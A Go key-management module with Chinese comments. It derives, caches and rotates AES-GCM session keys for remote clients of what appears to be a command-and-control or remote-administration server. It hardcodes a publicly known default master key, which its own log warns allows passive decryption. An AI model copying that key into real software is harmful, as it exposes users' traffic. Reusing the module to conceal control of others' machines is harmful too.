package encrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	r "math/rand"
	"strconv"
	"strings"
	"sync"
	"time"

	"BackendTemplate/pkg/database"

	"BackendTemplate/pkg/utils/logx"
	"golang.org/x/crypto/hkdf"
)

// SecureKeyManager 安全密钥管理器
type SecureKeyManager struct {
	masterKey          []byte
	sessionKeys        sync.Map // map[string]*SessionKeySet
	mu                 sync.RWMutex
	keyRotationEnabled bool
	overlapDuration    time.Duration // 密钥重叠期时长
}

// SessionKeySet 会话密钥集合（支持密钥重叠期）
type SessionKeySet struct {
	CurrentKey  *SessionKey
	PreviousKey *SessionKey // 上一个密钥，在重叠期内仍可用于解密
	NextKey     *SessionKey // 下一个密钥，在准备阶段生成
	// P3-1 轮换链路：记录派生输入（监听器 VKey/盐），轮换时用于生成 NextKey；
	// nextNonce 暂存待下发的轮换 nonce（经 CurrentKey 加密下发，客户端用同一 nonce 重派生）。
	masterKey      []byte
	encryptionSalt []byte
	nextNonce      []byte
	mu             sync.RWMutex
}

// KeyRotationMsgType 密钥轮换消息类型（服务端→客户端，携带轮换 nonce(16B)）
const KeyRotationMsgType = 5

// KeyRotateAckReplyType 密钥轮换确认回包类型（客户端→服务端，空载荷）
const KeyRotateAckReplyType = 121

// KeyRotationSender 由 main.go 注入的下发回调（经 sendcommand 按协议加密发送）。
// encrypt 包不依赖 sendcommand（避免循环依赖），轮换消息经回调走命令链路下发。
var KeyRotationSender func(clientID string, payload []byte)

// SessionKey 会话密钥
type SessionKey struct {
	Key       []byte
	CreatedAt time.Time
	ExpiresAt time.Time
	KeyID     string // 密钥标识符
	Version   int    // 密钥版本号
}

// KeyNegotiationMessage 密钥协商消息
type KeyNegotiationMessage struct {
	MessageType string `json:"message_type"` // "key_update_request" | "key_update_response" | "key_switch_confirm"
	KeyID       string `json:"key_id"`
	KeyVersion  int    `json:"key_version"`
	Salt        []byte `json:"salt"`
	Timestamp   int64  `json:"timestamp"`
	ClientID    string `json:"client_id"`
}

// SessionKeyInfoProvider 会话密钥派生盐上下文提供者(由 main 从配置注入;默认中性随机串)
var SessionKeyInfoProvider = func() string { return "8d2c91f4a6" }

// GlobalKeyManager 全局密钥管理器实例
var GlobalKeyManager *SecureKeyManager

// EnableKeyDebugLog 控制是否输出密钥派生相关的调试日志。
// 默认关闭：密钥材料（主密钥/盐/会话密钥）绝不应打印到 stdout，否则服务器日志会泄露密钥。
// 仅在本地排障时显式置为 true，且即便开启也只输出长度而非原始字节。
var EnableKeyDebugLog = false

// InitSecureKeyManager 初始化安全密钥管理器
func InitSecureKeyManager() error {
	// 使用默认主密钥作为全局fallback密钥（兼容性：保持与既有客户端一致）
	masterKey := make([]byte, 32)
	copy(masterKey, []byte("initial_master_key_12345678901"))
	// 如果密钥长度不足32字节，用零填充
	for i := len("initial_master_key_12345678901"); i < 32; i++ {
		masterKey[i] = 0
	}

	// 安全告警：使用源码内置默认主密钥（可被动解密流量），生产环境应配置自定义密钥
	logx.Println("⚠️⚠️ [安全告警] 正在使用内置默认主密钥（initial_master_key_12345678901）——该密钥公开且可预测")
	logx.Println("⚠️⚠️ [安全告警] 请为每个监听器配置独立 VKey/加密盐（监听管理页），并避免使用默认值")

	GlobalKeyManager = &SecureKeyManager{
		masterKey:          masterKey,
		keyRotationEnabled: true,
		overlapDuration:    2 * time.Hour, // 2小时重叠期
	}

	// 启动密钥轮换管理器
	go GlobalKeyManager.startKeyRotationManager()

	logx.Infof("🔑 [SERVER-INIT] 安全密钥管理器初始化成功，支持动态密钥配置\n")
	return nil
}

// DeriveSessionKey 派生会话密钥（支持动态配置）
func (skm *SecureKeyManager) DeriveSessionKey(clientID string, salt []byte) ([]byte, error) {
	return skm.DeriveSessionKeyForListener(clientID, salt, "")
}

// DeriveSessionKeyForListener 为特定监听器派生会话密钥
func (skm *SecureKeyManager) DeriveSessionKeyForListener(clientID string, salt []byte, listenerType string) ([]byte, error) {
	// 获取监听器特定的密钥配置
	masterKey, encryptionSalt := GetListenerKeyConfig(listenerType)
	return skm.DeriveSessionKeyForListenerWithKeys(clientID, salt, masterKey, encryptionSalt)
}

// DeriveSessionKeyForListenerWithKeys 使用显式主密钥/盐值派生会话密钥
// （正向连接手动连接自定义密钥时使用，确保与服务端/客户端 patched 密钥一致）
func (skm *SecureKeyManager) DeriveSessionKeyForListenerWithKeys(clientID string, salt, masterKey, encryptionSalt []byte) ([]byte, error) {
	skm.mu.Lock()
	defer skm.mu.Unlock()

	// 【调试日志】仅在 EnableKeyDebugLog=true 时输出，且只打印长度，绝不打印原始密钥字节
	if EnableKeyDebugLog {
		logx.Debugf("🔍 [SERVER-KEY-DEBUG] 派生会话密钥: ClientID=%s, SaltLen=%d\n", clientID, len(salt))
	}

	// 检查是否已存在密钥集
	var keySet *SessionKeySet
	if value, ok := skm.sessionKeys.Load(clientID); ok {
		keySet = value.(*SessionKeySet)
	} else {
		keySet = &SessionKeySet{}
		skm.sessionKeys.Store(clientID, keySet)
	}

	keySet.mu.Lock()
	defer keySet.mu.Unlock()

	// P3-1 轮换链路：记录派生输入（监听器 VKey/盐），轮换时用同输入 + 新 nonce 生成 NextKey，
	// 确保客户端可用同公式重派生（原 prepareKeyUpdate 误用全局默认密钥 → 客户端永远算不出新密钥）。
	keySet.masterKey = append([]byte{}, masterKey...)
	keySet.encryptionSalt = append([]byte{}, encryptionSalt...)

	if EnableKeyDebugLog {
		logx.Infof("  - 主密钥长度: %d, 盐值长度: %d\n", len(masterKey), len(encryptionSalt))
	}

	// 使用 HKDF 派生会话密钥
	hkdf := hkdf.New(sha256.New, masterKey, encryptionSalt, []byte(SessionKeyInfoProvider()+clientID))
	sessionKey := make([]byte, 32)
	if _, err := io.ReadFull(hkdf, sessionKey); err != nil {
		return nil, fmt.Errorf("派生会话密钥失败: %v", err)
	}

	// 【关键修复】生成确定性密钥ID时使用与客户端一致的盐值
	// 如果传入了salt参数，使用传入的salt；否则使用监听器配置的encryptionSalt
	var keyIDSalt []byte
	if len(salt) > 0 {
		// 使用传入的salt（与客户端保持一致）
		keyIDSalt = salt
		if EnableKeyDebugLog {
			logx.Infof("🔑 [SERVER-KEY] 使用传入的salt生成密钥ID: ClientID=%s, SaltLen=%d\n", clientID, len(keyIDSalt))
		}
	} else {
		// 使用监听器配置的encryptionSalt
		keyIDSalt = encryptionSalt
		if EnableKeyDebugLog {
			logx.Infof("🔑 [SERVER-KEY] 使用监听器encryptionSalt生成密钥ID: ClientID=%s, SaltLen=%d\n", clientID, len(keyIDSalt))
		}
	}

	keyIDInput := clientID + "_session_" + string(keyIDSalt)
	hasher := md5.New()
	hasher.Write([]byte(keyIDInput))
	keyIDBytes := hasher.Sum(nil)
	keyID := hex.EncodeToString(keyIDBytes[:8]) // 使用前8字节

	version := 1
	if keySet.CurrentKey != nil {
		version = keySet.CurrentKey.Version + 1
	}

	// 将当前密钥设为上一个密钥
	if keySet.CurrentKey != nil {
		keySet.PreviousKey = keySet.CurrentKey
	}

	// 创建新的当前密钥
	keySet.CurrentKey = &SessionKey{
		Key:       sessionKey,
		CreatedAt: time.Now(),
		ExpiresAt: time.Now().Add(24 * time.Hour), // 24小时过期
		KeyID:     keyID,
		Version:   version,
	}

	logx.Infof("🔑 [SERVER] 为客户端 %s 派生会话密钥: KeyID=%s, Version=%d\n", clientID, keyID, version)
	return keySet.CurrentKey.Key, nil
}

// RotateSessionKeyWithNonce 会话密钥唯一化：用每连接随机 nonce 重派生会话密钥。
// 原实现同一监听器所有客户端共享同一把 HKDF 密钥（提取任一客户端二进制即可解密该监听器全部会话）；
// 加入 nonce 后每会话唯一，提取客户端只能解密自己的会话。
// 调用前须已完成初始派生（CurrentKey=初始密钥）；本函数将初始密钥降为 PreviousKey（用于下发 nonce），
// 带 nonce 的新密钥成为 CurrentKey（用于后续通信）。返回上一密钥（初始，供加密 nonce 下发消息）。
func (skm *SecureKeyManager) RotateSessionKeyWithNonce(clientID string, salt, masterKey, encryptionSalt, nonce []byte) ([]byte, error) {
	skm.mu.Lock()
	defer skm.mu.Unlock()

	value, ok := skm.sessionKeys.Load(clientID)
	if !ok {
		return nil, fmt.Errorf("客户端 %s 无初始会话密钥", clientID)
	}
	keySet := value.(*SessionKeySet)
	keySet.mu.Lock()
	defer keySet.mu.Unlock()

	initialKey := keySet.CurrentKey
	if initialKey == nil {
		return nil, fmt.Errorf("客户端 %s 无初始会话密钥", clientID)
	}

	// 初始密钥降为上一密钥（用于解密客户端在协商前的消息与下发 nonce）
	keySet.PreviousKey = initialKey

	// 带 nonce 派生新密钥
	hk := hkdf.New(sha256.New, masterKey, encryptionSalt, []byte(SessionKeyInfoProvider()+clientID+string(nonce)))
	sessionKey := make([]byte, 32)
	if _, err := io.ReadFull(hk, sessionKey); err != nil {
		return nil, fmt.Errorf("派生会话密钥失败: %v", err)
	}

	version := initialKey.Version + 1
	keySet.CurrentKey = &SessionKey{
		Key:       sessionKey,
		CreatedAt: time.Now(),
		ExpiresAt: time.Now().Add(24 * time.Hour),
		KeyID:     fmt.Sprintf("%s-n%d", initialKey.KeyID, version),
		Version:   version,
	}
	logx.Infof("🔑 [SERVER] 客户端 %s 会话密钥唯一化完成 (nonce): %s -> %s\n",
		clientID, initialKey.KeyID, keySet.CurrentKey.KeyID)
	return initialKey.Key, nil
}

// GetSessionKey 获取会话密钥
func (skm *SecureKeyManager) GetSessionKey(clientID string) ([]byte, error) {
	if value, ok := skm.sessionKeys.Load(clientID); ok {
		keySet := value.(*SessionKeySet)
		keySet.mu.RLock()
		defer keySet.mu.RUnlock()

		if keySet.CurrentKey != nil && time.Now().Before(keySet.CurrentKey.ExpiresAt) {
			return keySet.CurrentKey.Key, nil
		}

		// 当前密钥已过期，检查上一个密钥是否在重叠期内
		if keySet.PreviousKey != nil {
			overlapEnd := keySet.PreviousKey.ExpiresAt.Add(skm.overlapDuration)
			if time.Now().Before(overlapEnd) {
				return keySet.PreviousKey.Key, nil
			}
		}

		// 所有密钥都已过期，清理旧密钥
		skm.sessionKeys.Delete(clientID)
	}
	return nil, errors.New("会话密钥不存在或已过期")
}

// GetSessionKeyWithFallback 获取会话密钥（带降级支持）
func (skm *SecureKeyManager) GetSessionKeyWithFallback(clientID string) (*SessionKey, error) {
	if value, ok := skm.sessionKeys.Load(clientID); ok {
		keySet := value.(*SessionKeySet)
		keySet.mu.RLock()
		defer keySet.mu.RUnlock()

		// 优先返回当前密钥
		if keySet.CurrentKey != nil && time.Now().Before(keySet.CurrentKey.ExpiresAt) {
			return keySet.CurrentKey, nil
		}

		// 降级到上一个密钥
		if keySet.PreviousKey != nil {
			overlapEnd := keySet.PreviousKey.ExpiresAt.Add(skm.overlapDuration)
			if time.Now().Before(overlapEnd) {
				return keySet.PreviousKey, nil
			}
		}
	}
	return nil, errors.New("会话密钥不存在或已过期")
}

// 密钥生成 (向后兼容)
func generateKey() []byte {
	key := make([]byte, 32) // 256 bits key
	if _, err := rand.Read(key); err != nil {
		panic(err)
	}
	return key
}

// aeadCache 按密钥缓存 cipher.AEAD。aes.NewCipher（含 key schedule）+ cipher.NewGCM（含 GHASH
// 初始化）开销大，而会话密钥稳定 24h、监听器主密钥更久，应复用。键为 key 字节序列的 string 视图。
// P1-2C: LRU 置换替代原"超限全清"抖动（零第三方依赖，单锁 LRU 2048 条）
var (
	aeadCacheMu sync.Mutex
	aeadCacheLRU = newAeadLRU(2048)
)

const aeadCacheMaxEntries = 2048

type aeadLRUEntry struct {
	key  string
	aead cipher.AEAD
	prev, next *aeadLRUEntry
}
type aeadLRU struct {
	cap   int
	m     map[string]*aeadLRUEntry
	head, tail *aeadLRUEntry
}
func newAeadLRU(cap int) *aeadLRU { return &aeadLRU{cap: cap, m: make(map[string]*aeadLRUEntry)} }
func (l *aeadLRU) get(k string) (cipher.AEAD, bool) {
	if e, ok := l.m[k]; ok {
		l.moveToFront(e)
		return e.aead, true
	}
	return nil, false
}
func (l *aeadLRU) put(k string, a cipher.AEAD) {
	if e, ok := l.m[k]; ok {
		e.aead = a
		l.moveToFront(e)
		return
	}
	e := &aeadLRUEntry{key: k, aead: a}
	l.m[k] = e
	l.pushFront(e)
	if len(l.m) > l.cap {
		v := l.tail
		l.remove(v)
		delete(l.m, v.key)
	}
}
func (l *aeadLRU) pushFront(e *aeadLRUEntry) {
	e.prev = nil
	e.next = l.head
	if l.head != nil {
		l.head.prev = e
	}
	l.head = e
	if l.tail == nil {
		l.tail = e
	}
}
func (l *aeadLRU) moveToFront(e *aeadLRUEntry) {
	if l.head == e {
		return
	}
	l.remove(e)
	l.pushFront(e)
}
func (l *aeadLRU) remove(e *aeadLRUEntry) {
	if e.prev != nil {
		e.prev.next = e.next
	} else {
		l.head = e.next
	}
	if e.next != nil {
		e.next.prev = e.prev
	} else {
		l.tail = e.prev
	}
	e.prev, e.next = nil, nil
}

// getAEAD 取（必要时构建并缓存）指定密钥的 AES-GCM AEAD。
func getAEAD(key []byte) (cipher.AEAD, error) {
	k := string(key)
	aeadCacheMu.Lock()
	if v, ok := aeadCacheLRU.get(k); ok {
		aeadCacheMu.Unlock()
		return v, nil
	}
	aeadCacheMu.Unlock()
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("创建密码块失败: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建 GCM 失败: %v", err)
	}
	aeadCacheMu.Lock()
	aeadCacheLRU.put(k, gcm)
	aeadCacheMu.Unlock()
	return gcm, nil
}

// SecureEncrypt 使用 AES-GCM 进行安全加密
func SecureEncrypt(data []byte, key []byte) ([]byte, error) {
	gcm, err := getAEAD(key)
	if err != nil {
		return nil, err
	}

	// 生成随机 nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("生成 nonce 失败: %v", err)
	}

	// 加密数据
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

// SecureDecrypt 使用 AES-GCM 进行安全解密
func SecureDecrypt(ciphertext []byte, key []byte) ([]byte, error) {
	gcm, err := getAEAD(key)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("密文太短")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

	// 解密数据
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("解密失败: %v", err)
	}

	return plaintext, nil
}

// EncryptWithSessionKey 使用会话密钥加密（支持动态配置）
func EncryptWithSessionKey(data []byte, clientID string) ([]byte, error) {
	return EncryptWithSessionKeyForListener(data, clientID, "")
}

// EncryptWithSessionKeyForListener 为特定监听器使用会话密钥加密
func EncryptWithSessionKeyForListener(data []byte, clientID string, listenerType string) ([]byte, error) {
	if GlobalKeyManager == nil {
		return nil, errors.New("密钥管理器未初始化")
	}

	sessionKey, err := GlobalKeyManager.GetSessionKey(clientID)
	if err != nil {
		// 如果会话密钥不存在，使用监听器特定配置生成新的
		_, encryptionSalt := GetListenerKeyConfig(listenerType)
		sessionKey, err = GlobalKeyManager.DeriveSessionKeyForListener(clientID, encryptionSalt, listenerType)
		if err != nil {
			return nil, err
		}
		logx.Infof("🔑 [SERVER-ENCRYPT] 为客户端 %s 重新生成会话密钥（监听器: %s）\n", clientID, listenerType)
	}

	return SecureEncrypt(data, sessionKey)
}

// DecryptWithSessionKey 使用会话密钥解密（支持密钥重叠期）
func DecryptWithSessionKey(ciphertext []byte, clientID string) ([]byte, error) {
	if GlobalKeyManager == nil {
		return nil, errors.New("密钥管理器未初始化")
	}

	// 获取会话密钥集
	value, ok := GlobalKeyManager.sessionKeys.Load(clientID)
	if !ok {
		// 【加密体系改造】无会话密钥直接报错
		return nil, fmt.Errorf("客户端无会话密钥: %s", clientID)
	}

	keySet := value.(*SessionKeySet)
	keySet.mu.RLock()
	defer keySet.mu.RUnlock()

	// 尝试使用当前密钥解密
	if keySet.CurrentKey != nil && time.Now().Before(keySet.CurrentKey.ExpiresAt) {
		plaintext, err := SecureDecrypt(ciphertext, keySet.CurrentKey.Key)
		if err == nil {
			logx.Infof("🔓 [SERVER] 使用当前会话密钥解密: %s\n", clientID)
			return plaintext, nil
		}
		// 如果高级解密失败，继续尝试其他方式
		logx.Warnf("⚠️ [SERVER] 当前密钥解密失败: %v\n", err)
	}

	// 尝试使用上一个密钥解密（重叠期内）
	if keySet.PreviousKey != nil {
		overlapEnd := keySet.PreviousKey.ExpiresAt.Add(GlobalKeyManager.overlapDuration)
		if time.Now().Before(overlapEnd) {
			plaintext, err := SecureDecrypt(ciphertext, keySet.PreviousKey.Key)
			if err == nil {
				logx.Infof("🔓 [SERVER] 使用上一个会话密钥解密: %s\n", clientID)
				return plaintext, nil
			}
			logx.Warnf("⚠️ [SERVER] 上一个密钥解密失败: %v\n", err)
		}
	}

	// P3-1: 轮换确认窗口——客户端切换后立即用新密钥加密回包，
	// 需尝试 NextKey 解密（ConfirmKeyRotation 前）
	if keySet.NextKey != nil {
		plaintext, err := SecureDecrypt(ciphertext, keySet.NextKey.Key)
		if err == nil {
			logx.Infof("🔓 [SERVER] 使用轮换新密钥解密: %s\n", clientID)
			return plaintext, nil
		}
	}

	// 【加密体系改造】高级解密失败直接报错，不再回落旧加密
	return nil, fmt.Errorf("会话密钥解密失败")
}

// 解密函数

// EncodeBase64 将 []byte 编码为 Base64 并返回 []byte
func EncodeBase64(data []byte) ([]byte, error) {
	encodedString := base64.StdEncoding.EncodeToString(data)
	return []byte(encodedString), nil
}

// DecodeBase64 将 Base64 编码的 []byte 解码回原始的 []byte
func DecodeBase64(encodedData []byte) ([]byte, error) {
	decodedData, err := base64.StdEncoding.DecodeString(string(encodedData))
	if err != nil {
		return nil, err
	}
	return decodedData, nil
}

// StringToMD5 计算字符串的 MD5 哈希值
func BytesToMD5(s []byte) string {
	// 创建一个新的 MD5 哈希对象
	hasher := md5.New()

	// 将字符串写入哈希对象
	hasher.Write(s)

	// 获取哈希值的字节切片
	md5Bytes := hasher.Sum(nil)

	// 将字节切片转换为十六进制字符串
	return fmt.Sprintf("%x", md5Bytes)
}

func GenRandomLogID() string {
	// 设定随机数的范围
	min := 3000000000
	max := 4000000000 // 确保最大值大于 3796460677，以包含它

	// 生成随机数
	randomNumber := r.Intn(max-min) + min
	randomString := strconv.Itoa(randomNumber)
	return randomString
}

// 生成一个指定长度的随机字节数组
func GenRandomBytes() []byte {
	min := 3000
	max := 4000 // 确保最大值大于 3796460677，以包含它
	// 生成随机数
	n := r.Intn(max-min) + min
	// 创建一个长度为 n 的字节切片
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return nil
	}
	return b
}

// startKeyRotationManager 启动密钥轮换管理器
func (skm *SecureKeyManager) startKeyRotationManager() {
	if !skm.keyRotationEnabled {
		return
	}

	// 每 6 小时检查一次密钥是否需要轮换（原 20h：密钥 24h 过期，20h 才检查导致
	// 接近过期的密钥来不及轮换就失效，轮换窗口太窄）
	ticker := time.NewTicker(6 * time.Hour)
	defer ticker.Stop()

	for range ticker.C {
		skm.rotateExpiredKeys()
	}
}

// rotateExpiredKeys 轮换过期的密钥
func (skm *SecureKeyManager) rotateExpiredKeys() {
	skm.sessionKeys.Range(func(key, value interface{}) bool {
		clientID := key.(string)
		keySet := value.(*SessionKeySet)

		keySet.mu.Lock()
		defer keySet.mu.Unlock()

		// 检查当前密钥是否接近过期（24小时内）
		if keySet.CurrentKey != nil {
			timeToExpiry := time.Until(keySet.CurrentKey.ExpiresAt)
			if timeToExpiry <= 4*time.Hour && timeToExpiry > 0 {
				// 生成新密钥
				skm.prepareKeyUpdate(clientID, keySet)
			}
		}

		// 清理过旧的上一个密钥
		if keySet.PreviousKey != nil {
			overlapEnd := keySet.PreviousKey.ExpiresAt.Add(skm.overlapDuration)
			if time.Now().After(overlapEnd) {
				keySet.PreviousKey = nil
			}
		}

		// P3-1: 清理未被确认的轮换密钥（客户端离线/ACK 丢失时允许下次轮换重试，
		// 原实现 NextKey 永久悬挂 → 该客户端永远无法再轮换）
		if keySet.NextKey != nil && time.Since(keySet.NextKey.CreatedAt) > 2*time.Hour {
			logx.Infof("🔑 [KEY-UPDATE] 客户端 %s 轮换确认超时，清理未确认的新密钥，等待重试\n", clientID)
			keySet.NextKey = nil
			keySet.nextNonce = nil
		}

		return true
	})
}

// prepareKeyUpdate 准备密钥更新（P3-1 补全链路）：
// 生成每会话随机 nonce，用该会话记录的监听器 VKey/盐派生 NextKey（与客户端
// SetSessionKeyWithNonce 同公式），再经命令链路下发 type=5|nonce。
// 客户端确认（KeyRotateAckReplyType 回包）后由 ConfirmKeyRotation 提升 NextKey。
func (skm *SecureKeyManager) prepareKeyUpdate(clientID string, keySet *SessionKeySet) {
	if keySet.NextKey != nil {
		return // 已经准备了新密钥
	}

	// 派生输入缺失（理论上首次派生时已记录）：跳过，避免用错误密钥派生
	if len(keySet.masterKey) == 0 || len(keySet.encryptionSalt) == 0 {
		logx.Warnf("⚠️ [KEY-UPDATE] 客户端 %s 无派生输入记录，跳过轮换\n", clientID)
		return
	}

	// 生成轮换 nonce（每会话随机，与首连唯一化同机制）
	nonce := make([]byte, 16)
	if _, err := rand.Read(nonce); err != nil {
		logx.Warnf("⚠️ [KEY-UPDATE] 生成轮换 nonce 失败: %v\n", err)
		return
	}
	keySet.nextNonce = append([]byte{}, nonce...)

	// 用监听器 VKey/盐 + 新 nonce 派生 NextKey（与客户端 SetSessionKeyWithNonce 公式一致）
	hk := hkdf.New(sha256.New, keySet.masterKey, keySet.encryptionSalt, []byte(SessionKeyInfoProvider()+clientID+string(nonce)))
	nextSessionKey := make([]byte, 32)
	if _, err := io.ReadFull(hk, nextSessionKey); err != nil {
		logx.Warnf("⚠️ [KEY-UPDATE] 派生新密钥失败: %v\n", err)
		keySet.nextNonce = nil
		return
	}

	version := 1
	if keySet.CurrentKey != nil {
		version = keySet.CurrentKey.Version + 1
	}
	keyIDBytes := make([]byte, 8)
	rand.Read(keyIDBytes)

	keySet.NextKey = &SessionKey{
		Key:       nextSessionKey,
		CreatedAt: time.Now(),
		ExpiresAt: time.Now().Add(24 * time.Hour),
		KeyID:     hex.EncodeToString(keyIDBytes),
		Version:   version,
	}

	logx.Infof("🔑 [KEY-UPDATE] 客户端 %s 已准备新密钥: KeyID=%s, Version=%d\n",
		clientID, keySet.NextKey.KeyID, keySet.NextKey.Version)

	// 下发轮换消息（type=5|nonce，经当前会话密钥加密走命令链路）
	skm.notifyKeyUpdate(clientID, keySet)
}

// notifyKeyUpdate 下发密钥轮换消息：type(4)|nonce(16)，由 KeyRotationSender 回调
// （main.go 注入 sendcommand）按客户端协议加密发送。
func (skm *SecureKeyManager) notifyKeyUpdate(clientID string, keySet *SessionKeySet) {
	if keySet.NextKey == nil || len(keySet.nextNonce) == 0 {
		return
	}

	msg := make([]byte, 4+len(keySet.nextNonce))
	binary.BigEndian.PutUint32(msg[:4], KeyRotationMsgType)
	copy(msg[4:], keySet.nextNonce)

	if KeyRotationSender == nil {
		logx.Warnf("⚠️ [KEY-UPDATE] KeyRotationSender 未注入，无法下发轮换消息 (uid=%s)\n", clientID)
		return
	}
	KeyRotationSender(clientID, msg)
	logx.Infof("🔑 [KEY-UPDATE] 已向客户端 %s 下发密钥轮换消息: KeyID=%s\n",
		clientID, keySet.NextKey.KeyID)
}

// ConfirmKeyRotation 客户端确认轮换后提升 NextKey（当前密钥降为 PreviousKey 供重叠期解密）。
// 由 HandleClientReply 收到 KeyRotateAckReplyType 回包时调用。
func (skm *SecureKeyManager) ConfirmKeyRotation(clientID string) error {
	value, ok := skm.sessionKeys.Load(clientID)
	if !ok {
		return errors.New("客户端会话不存在")
	}
	keySet := value.(*SessionKeySet)
	keySet.mu.Lock()
	defer keySet.mu.Unlock()

	if keySet.NextKey == nil {
		return errors.New("无待确认的轮换密钥")
	}

	// 旧密钥降为 PreviousKey（轮换前消息仍可解密），NextKey 成为 CurrentKey
	keySet.PreviousKey = keySet.CurrentKey
	keySet.CurrentKey = keySet.NextKey
	keySet.NextKey = nil
	keySet.nextNonce = nil

	logx.Infof("✅ [KEY-SWITCH] 客户端 %s 密钥轮换确认完成: KeyID=%s, Version=%d\n",
		clientID, keySet.CurrentKey.KeyID, keySet.CurrentKey.Version)
	return nil
}

// HandleKeyNegotiation 处理密钥协商消息
func (skm *SecureKeyManager) HandleKeyNegotiation(clientID string, msg KeyNegotiationMessage) error {
	switch msg.MessageType {
	case "key_update_response":
		return skm.handleKeyUpdateResponse(clientID, msg)
	case "key_switch_confirm":
		return skm.handleKeySwitchConfirm(clientID, msg)
	default:
		return fmt.Errorf("未知的密钥协商消息类型: %s", msg.MessageType)
	}
}

// handleKeyUpdateResponse 处理密钥更新响应
func (skm *SecureKeyManager) handleKeyUpdateResponse(clientID string, msg KeyNegotiationMessage) error {
	value, ok := skm.sessionKeys.Load(clientID)
	if !ok {
		return errors.New("客户端会话不存在")
	}

	keySet := value.(*SessionKeySet)
	keySet.mu.Lock()
	defer keySet.mu.Unlock()

	// 验证密钥版本
	if keySet.NextKey == nil || keySet.NextKey.KeyID != msg.KeyID {
		return errors.New("密钥版本不匹配")
	}

	logx.Infof("✅ [KEY-UPDATE] 客户端 %s 确认密钥更新: KeyID=%s\n", clientID, msg.KeyID)
	return nil
}

// handleKeySwitchConfirm 处理密钥切换确认
func (skm *SecureKeyManager) handleKeySwitchConfirm(clientID string, msg KeyNegotiationMessage) error {
	value, ok := skm.sessionKeys.Load(clientID)
	if !ok {
		return errors.New("客户端会话不存在")
	}

	keySet := value.(*SessionKeySet)
	keySet.mu.Lock()
	defer keySet.mu.Unlock()

	// 验证密钥版本
	if keySet.NextKey == nil || keySet.NextKey.KeyID != msg.KeyID {
		return errors.New("密钥版本不匹配")
	}

	// 执行密钥切换
	keySet.PreviousKey = keySet.CurrentKey
	keySet.CurrentKey = keySet.NextKey
	keySet.NextKey = nil

	logx.Infof("✅ [KEY-SWITCH] 客户端 %s 密钥切换完成: KeyID=%s, Version=%d\n",
		clientID, keySet.CurrentKey.KeyID, keySet.CurrentKey.Version)

	return nil
}

// ForceKeyRotation 强制密钥轮换（用于管理员手动触发）
func (skm *SecureKeyManager) ForceKeyRotation(clientID string) error {
	value, ok := skm.sessionKeys.Load(clientID)
	if !ok {
		return errors.New("客户端会话不存在")
	}

	keySet := value.(*SessionKeySet)
	keySet.mu.Lock()
	defer keySet.mu.Unlock()

	skm.prepareKeyUpdate(clientID, keySet)
	logx.Infof("🔄 [FORCE-ROTATION] 强制轮换客户端 %s 的密钥\n", clientID)

	return nil
}

// GetKeyStatus 获取密钥状态信息
func (skm *SecureKeyManager) GetKeyStatus(clientID string) map[string]interface{} {
	status := map[string]interface{}{
		"client_id": clientID,
		"exists":    false,
	}

	value, ok := skm.sessionKeys.Load(clientID)
	if !ok {
		return status
	}

	keySet := value.(*SessionKeySet)
	keySet.mu.RLock()
	defer keySet.mu.RUnlock()

	status["exists"] = true

	if keySet.CurrentKey != nil {
		status["current_key"] = map[string]interface{}{
			"key_id":         keySet.CurrentKey.KeyID,
			"version":        keySet.CurrentKey.Version,
			"created_at":     keySet.CurrentKey.CreatedAt,
			"expires_at":     keySet.CurrentKey.ExpiresAt,
			"time_to_expiry": time.Until(keySet.CurrentKey.ExpiresAt).String(),
		}
	}

	if keySet.PreviousKey != nil {
		status["previous_key"] = map[string]interface{}{
			"key_id":      keySet.PreviousKey.KeyID,
			"version":     keySet.PreviousKey.Version,
			"expires_at":  keySet.PreviousKey.ExpiresAt,
			"overlap_end": keySet.PreviousKey.ExpiresAt.Add(skm.overlapDuration),
		}
	}

	if keySet.NextKey != nil {
		status["next_key"] = map[string]interface{}{
			"key_id":     keySet.NextKey.KeyID,
			"version":    keySet.NextKey.Version,
			"created_at": keySet.NextKey.CreatedAt,
		}
	}

	return status
}

// TimeToExpiry 返回该客户端当前会话密钥的剩余有效期。
//
// 心跳热路径专用：GetKeyStatus 会分配多个 map 并把 Duration 格式化成字符串
// （调用方再 strings.Contains + ParseDuration 解析回来），每条心跳都做一次
// 很浪费。这里只读一个时间字段，无分配。
func (skm *SecureKeyManager) TimeToExpiry(clientID string) (time.Duration, bool) {
	value, ok := skm.sessionKeys.Load(clientID)
	if !ok {
		return 0, false
	}
	keySet := value.(*SessionKeySet)
	keySet.mu.RLock()
	defer keySet.mu.RUnlock()
	if keySet.CurrentKey == nil || keySet.CurrentKey.ExpiresAt.IsZero() {
		return 0, false
	}
	return time.Until(keySet.CurrentKey.ExpiresAt), true
}

// GetOverlapDuration 获取密钥重叠期时长
func (skm *SecureKeyManager) GetOverlapDuration() time.Duration {
	return skm.overlapDuration
}

// SetOverlapDuration 设置密钥重叠期时长
func (skm *SecureKeyManager) SetOverlapDuration(duration time.Duration) {
	skm.mu.Lock()
	defer skm.mu.Unlock()
	skm.overlapDuration = duration
}

// IsRotationEnabled 检查是否启用密钥轮换
func (skm *SecureKeyManager) IsRotationEnabled() bool {
	return skm.keyRotationEnabled
}

// SetRotationEnabled 设置密钥轮换状态
func (skm *SecureKeyManager) SetRotationEnabled(enabled bool) {
	skm.mu.Lock()
	defer skm.mu.Unlock()
	skm.keyRotationEnabled = enabled
}

// GetAllClientIDs 获取所有客户端ID列表
func (skm *SecureKeyManager) GetAllClientIDs() []string {
	var clientIDs []string
	skm.sessionKeys.Range(func(key, value interface{}) bool {
		clientIDs = append(clientIDs, key.(string))
		return true
	})
	return clientIDs
}

